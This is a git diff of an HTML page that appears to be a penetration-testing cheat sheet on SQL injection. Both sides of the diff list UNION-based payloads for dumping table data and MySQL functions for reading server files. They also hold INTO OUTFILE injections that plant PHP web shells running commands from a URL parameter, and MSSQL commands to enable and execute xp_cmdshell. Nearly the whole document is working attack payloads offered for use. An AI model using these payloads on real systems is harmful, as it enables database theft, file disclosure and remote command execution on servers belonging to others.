@@ -581,97 +581,96 @@ layout: default
                 </table>
             </td>
         </tr>
-    </table>
-    <tr>
-        <td>Enumerate data</td>
-        <td>
-            <table>
-                <tr>
-                    <td>Enumerate data_1 from column_1 of table_1</td>
-                    <td>' UNION SELECT  1,2,3,<mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark>--</td>
-                </tr>
-                <tr>
-                    <td>Enumerate data_2 from column_1 of table_1</td>
-                    <td>' UNION SELECT 1,2,3,<mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark> where <mark>&lt;column_1&gt;</mark> not in ('<mark>&lt;data_1&gt;</mark>')--</td>
-                </tr>
-            </table>
-        </td>
-    </tr>
-</table>
-
-<li>Other useful injections</li>
-<ul>
-    <li>'UNION SELECT 1,<mark>&lt;insert from the below&gt;</mark>,3-- -</li>
-</ul>
-
-<table>
-    <tr>
-        <td>Mysql version</td>
-        <td>@@version-- -</td>
-    </tr>
-    <tr>
-        <td>Mysql user</td>
-        <td>
-            <li>user()</li>
-            <li>system_user()</li>
-        </td>
-    </tr>
-    <tr>
-        <td>Read file</td>
-        <td>LOAD_FILE('<mark>&lt;File&gt;</mark>')</td>
-    </tr>
-    <tr>
-        <td>Reveal data directory</td>
-        <td>@@datadir</td>
-    </tr>
-    <tr>
-        <td>Display file contents in base64</td>
-        <td>
-            <li>TO_BASE64(<mark>&lt;file&gt;</mark>)</li>
-            <li>(select TO_BASE64(LOAD_FILE("C:\\inetpub\\wwwroot\\uploads\\shell.php")))</li>
-        </td>
-    </tr>
-    <tr>
-        <td>Create file</td>
-        <td>'union select ("<text>"),2,3,4,5,6 INTO OUTFILE '&lt;directory&gt;'-- -</td>
-        </tr>
         <tr>
-            <td>Create a reverse shell</td>
+            <td>Enumerate data</td>
             <td>
-                <li>' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -</li>
-                    <li>' UNION SELECT (<?php echo exec($_GET["cmd"]);) INTO OUTFILE '/srv/http/cmd.php';-- -</li>
-                    </td>
-                </tr>
-            </table>
-
-            <li>MSSQL</li>
-            <ul>
-                <li>xp_cmdshell</li>
-                <ul>
-                    <li>Only executable by 'sa' or other users with 'sysadmin' privileges</li>
-                    <li>Available by default on all MSSQL (Disabled on MSSQL 2005)</li>
-                </ul>
                 <table>
                     <tr>
-                        <td>Enable xp_cmdshell</td>
-                        <td>
-                            <table>
-                                <tr>
-                                    <td>Step #1</td>
-                                    <td>EXEC sp_configure 'show advanced options', 1; RECONFIGURE</td>
-                                </tr>
-                                <tr>
-                                    <td>Step #2</td>
-                                    <td>EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE</td>
-                                </tr>
-                            </table>
-                        </td>
+                        <td>Enumerate data_1 from column_1 of table_1</td>
+                        <td>' UNION SELECT  1,2,3,<mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark>--</td>
                     </tr>
                     <tr>
-                        <td>Execute xp_cmdshell</td>
-                        <td>EXEC xp_cmdshell &quot;&lt;system command&gt;&quot;</td>
+                        <td>Enumerate data_2 from column_1 of table_1</td>
+                        <td>' UNION SELECT 1,2,3,<mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark> where <mark>&lt;column_1&gt;</mark> not in ('<mark>&lt;data_1&gt;</mark>')--</td>
                     </tr>
                 </table>
-            </ul>
+            </td>
+        </tr>
+    </table>
+
+    <li>Other useful injections</li>
+    <ul>
+        <li>'UNION SELECT 1,<mark>&lt;insert from the below&gt;</mark>,3-- -</li>
+    </ul>
+
+    <table>
+        <tr>
+            <td>Mysql version</td>
+            <td>@@version-- -</td>
+        </tr>
+        <tr>
+            <td>Mysql user</td>
+            <td>
+                <li>user()</li>
+                <li>system_user()</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Read file</td>
+            <td>LOAD_FILE('<mark>&lt;File&gt;</mark>')</td>
+        </tr>
+        <tr>
+            <td>Reveal data directory</td>
+            <td>@@datadir</td>
+        </tr>
+        <tr>
+            <td>Display file contents in base64</td>
+            <td>
+                <li>TO_BASE64(<mark>&lt;file&gt;</mark>)</li>
+                <li>(select TO_BASE64(LOAD_FILE("C:\\inetpub\\wwwroot\\uploads\\shell.php")))</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Create file</td>
+            <td>'union select ("<text>"),2,3,4,5,6 INTO OUTFILE '&lt;directory&gt;'-- -</td>
+            </tr>
+            <tr>
+                <td>Create a reverse shell</td>
+                <td>
+                    <li>' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -</li>
+                        <li>' UNION SELECT (<?php echo exec($_GET["cmd"]);) INTO OUTFILE '/srv/http/cmd.php';-- -</li>
+                        </td>
+                    </tr>
+                </table>
+
+                <li>MSSQL</li>
+                <ul>
+                    <li>xp_cmdshell</li>
+                    <ul>
+                        <li>Only executable by 'sa' or other users with 'sysadmin' privileges</li>
+                        <li>Available by default on all MSSQL (Disabled on MSSQL 2005)</li>
+                    </ul>
+                    <table>
+                        <tr>
+                            <td>Enable xp_cmdshell</td>
+                            <td>
+                                <table>
+                                    <tr>
+                                        <td>Step #1</td>
+                                        <td>EXEC sp_configure 'show advanced options', 1; RECONFIGURE</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Step #2</td>
+                                        <td>EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE</td>
+                                    </tr>
+                                </table>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>Execute xp_cmdshell</td>
+                            <td>EXEC xp_cmdshell &quot;&lt;system command&gt;&quot;</td>
+                        </tr>
+                    </table>
+                </ul>
 
 
